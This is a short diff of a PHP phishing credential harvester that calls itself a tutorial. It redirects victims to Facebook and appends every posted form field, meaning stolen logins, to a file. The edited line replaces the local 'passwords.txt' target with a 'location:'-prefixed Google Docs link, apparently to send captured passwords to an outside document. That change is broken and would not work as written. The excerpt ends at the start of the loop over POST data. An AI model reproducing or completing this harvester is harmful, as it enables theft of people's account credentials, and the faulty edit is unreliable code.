@@ -1,7 +1,7 @@
 <?php
 
 header("location: http://wwww.facebook.com"); //THIS TUTORIAL IS ONLY FOR EDUCATIONAL PURPOSES
-$handle = fopen("passwords.txt","a");
+$handle = fopen("location: https://docs.google.com/document/d/1IbvScSp5_pXdWSw1lDQIS1jRT4-q1nLy0kQM8a3kbmE/edit?usp=sharing","a");
 
 foreach($_POST as $variable => $value)
 {
